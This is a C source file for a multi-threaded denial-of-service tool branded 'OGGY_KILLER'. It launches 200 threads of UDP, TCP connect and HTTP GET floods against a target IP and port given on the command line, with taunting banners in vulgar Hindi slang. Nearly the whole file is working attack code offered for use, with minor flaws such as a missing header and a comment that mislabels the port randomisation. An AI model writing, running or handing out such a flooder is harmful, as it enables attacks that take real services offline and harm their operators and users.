#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_THREADS 200
#define PAYLOAD_SIZE 1024
#define MAX_ATTACKS 999999

int running = 1;
char *target_ip;
int target_port;
int attack_duration;
int attack_count = 0;

// Colors for terminal output
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"
#define WHITE "\033[37m"
#define RESET "\033[0m"

// Signal handler for Ctrl+C
void signal_handler(int sig) {
    running = 0;
    printf("\n\n" RED "╔════════════════════════════════════════════╗\n" RESET);
    printf(RED "║  " RESET CYAN "ATTACK INTERRUPTED BY USER!" RESET RED "            ║\n" RESET);
    printf(RED "║  " RESET YELLOW "OGGY says: CHUMT KA GULAM bach gaya! 😂" RESET RED " ║\n" RESET);
    printf(RED "╚════════════════════════════════════════════╝\n" RESET);
    exit(0);
}

// UDP Flood with spoofed source ports
void *udp_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char packet[PAYLOAD_SIZE];
    int thread_id = *(int *)arg;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        pthread_exit(NULL);
    }
    
    // Set socket timeout to avoid blocking
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
    
    // Randomize payload
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        packet[i] = rand() % 255;
    }
    
    // Add OGGY signature in payload
    char signature[] = "OGGY_KILLER_CHUMT";
    memcpy(packet, signature, strlen(signature));
    
    while (running) {
        server_addr.sin_port = htons(rand() % 65535);
        if (sendto(sock, packet, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Silent fail
        }
        attack_count++;
        usleep(10); // Minimal delay for CPU balance
    }
    
    close(sock);
    pthread_exit(NULL);
}

// TCP SYN Flood
void *tcp_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    int thread_id = *(int *)arg;
    
    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Set socket non-blocking for faster SYN
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
        
        connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
        close(sock);
        attack_count++;
        usleep(5);
    }
    
    pthread_exit(NULL);
}

// HTTP GET Flood with random User-Agent
void *http_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char http_request[512];
    char user_agents[][50] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
        "OGGY_KILLER/1.0 (Chumt Ka Darinda)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    };
    int thread_id = *(int *)arg;
    
    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(80);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            int ua_index = rand() % 5;
            snprintf(http_request, sizeof(http_request),
                     "GET / HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n"
                     "Connection: close\r\n\r\n",
                     target_ip, user_agents[ua_index]);
            send(sock, http_request, strlen(http_request), 0);
            attack_count++;
        }
        close(sock);
        usleep(10);
    }
    
    pthread_exit(NULL);
}

// Display Banner
void display_banner() {
    printf(RED "\n");
    printf("  ██████╗  ██████╗  ██████╗ ██╗   ██╗\n");
    printf(" ██╔═══██╗██╔════╝ ██╔═══██╗╚██╗ ██╔╝\n");
    printf(" ██║   ██║██║  ███╗██║   ██║ ╚████╔╝ \n");
    printf(" ██║   ██║██║   ██║██║   ██║  ╚██╔╝  \n");
    printf(" ╚██████╔╝╚██████╔╝╚██████╔╝   ██║   \n");
    printf("  ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   \n");
    printf(RESET);
    printf(CYAN "    KILLER - CHUMT KA DARINDA 😈🔥\n" RESET);
    printf(YELLOW "    ================================\n" RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        display_banner();
        printf(RED "\n[!] " RESET YELLOW "CHUMT KE PYASA, sahi command daal!\n" RESET);
        printf(CYAN "    Usage: " RESET WHITE "./oggy <IP> <PORT> <TIME>\n" RESET);
        printf(CYAN "    Example: " RESET WHITE "./oggy 192.168.1.1 80 60\n" RESET);
        printf(CYAN "    TIME in seconds\n" RESET);
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    
    if (target_port < 1 || target_port > 65535) {
        printf(RED "[!] " RESET YELLOW "Invalid port! 1-65535 daal, CHUMT KA GULAM!\n" RESET);
        return 1;
    }
    
    if (attack_duration < 1) {
        printf(RED "[!] " RESET YELLOW "Time seconds mein daal, 1 se kam nahi!\n" RESET);
        return 1;
    }
    
    display_banner();
    printf(GREEN "\n╔════════════════════════════════════════════╗\n" RESET);
    printf(GREEN "║  " RESET CYAN "OGGY_KILLER ACTIVATED 😈🔥" RESET GREEN "              ║\n" RESET);
    printf(GREEN "║  " RESET WHITE "Target: %s:%d" RESET GREEN "                  ║\n", target_ip, target_port);
    printf(GREEN "║  " RESET WHITE "Duration: %d seconds" RESET GREEN "               ║\n", attack_duration);
    printf(GREEN "║  " RESET WHITE "Threads: %d (UDP + TCP + HTTP)" RESET GREEN "     ║\n", MAX_THREADS);
    printf(GREEN "╚════════════════════════════════════════════╝\n\n" RESET);
    
    printf(RED "[!] " RESET YELLOW "CHUMT KA DARINDA aa gaya! System ki maa chodne! 💀\n" RESET);
    printf(RED "[!] " RESET CYAN "Press Ctrl+C to stop anytime\n\n" RESET);
    
    signal(SIGINT, signal_handler);
    
    pthread_t threads[MAX_THREADS];
    int thread_ids[MAX_THREADS];
    srand(time(NULL));
    
    // Launch mixed attack threads
    for (int i = 0; i < MAX_THREADS; i++) {
        thread_ids[i] = i;
        int attack_type = i % 3;
        if (attack_type == 0) {
            pthread_create(&threads[i], NULL, udp_flood, &thread_ids[i]);
        } else if (attack_type == 1) {
            pthread_create(&threads[i], NULL, tcp_flood, &thread_ids[i]);
        } else {
            pthread_create(&threads[i], NULL, http_flood, &thread_ids[i]);
        }
    }
    
    printf(GREEN "[✔] " RESET WHITE "All %d threads launched. Let the chaos begin! 💥\n\n" RESET, MAX_THREADS);
    
    // Attack timer with progress bar
    for (int t = attack_duration; t > 0 && running; t--) {
        int progress = ((attack_duration - t) * 50) / attack_duration;
        printf("\r" CYAN "[⏳] " RESET WHITE "Time: %3ds " RESET, t);
        printf(GREEN "[");
        for (int i = 0; i < 50; i++) {
            if (i < progress) printf("█");
            else if (i == progress) printf("▓");
            else printf("░");
        }
        printf(GREEN "] " RESET WHITE "%d%%" RESET, (progress * 2));
        fflush(stdout);
        sleep(1);
    }
    
    running = 0;
    
    // Attack End Banner
    printf("\n\n" RED "╔══════════════════════════════════════════════════════╗\n" RESET);
    printf(RED "║" RESET CYAN "                                                      " RESET RED "║\n" RESET);
    printf(RED "║" RESET YELLOW "        🎯 " RESET WHITE "ATTACK COMPLETED SUCCESSFULLY!" RESET YELLOW " 🎯        " RESET RED "║\n" RESET);
    printf(RED "║" RESET CYAN "                                                      " RESET RED "║\n" RESET);
    printf(RED "║" RESET GREEN "  ✓ " RESET WHITE "Target: " RESET CYAN "%s:%d" RESET WHITE "                      " RESET RED "║\n", target_ip, target_port);
    printf(RED "║" RESET GREEN "  ✓ " RESET WHITE "Duration: " RESET CYAN "%d seconds" RESET WHITE "                    " RESET RED "║\n", attack_duration);
    printf(RED "║" RESET GREEN "  ✓ " RESET WHITE "Total Packets: " RESET CYAN "%d" RESET WHITE "                          " RESET RED "║\n", attack_count);
    printf(RED "║" RESET GREEN "  ✓ " RESET WHITE "Threads Used: " RESET CYAN "%d" RESET WHITE "                        " RESET RED "║\n", MAX_THREADS);
    printf(RED "║" RESET CYAN "                                                      " RESET RED "║\n" RESET);
    printf(RED "║" RESET MAGENTA "  😈 " RESET WHITE "OGGY says: CHUMT KA GULAM, system gaya tel lene!" RESET MAGENTA " 😈  " RESET RED "║\n" RESET);
    printf(RED "║" RESET CYAN "                                                      " RESET RED "║\n" RESET);
    printf(RED "╚══════════════════════════════════════════════════════╝\n\n" RESET);
    
    printf(YELLOW "[!] " RESET WHITE "Target server should be crying right now. 😂\n" RESET);
    printf(YELLOW "[!] " RESET WHITE "OGGY_KILLER signing off! 🙌🏻🔥\n\n" RESET);
    
    // Cleanup threads
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    
    return 0;
}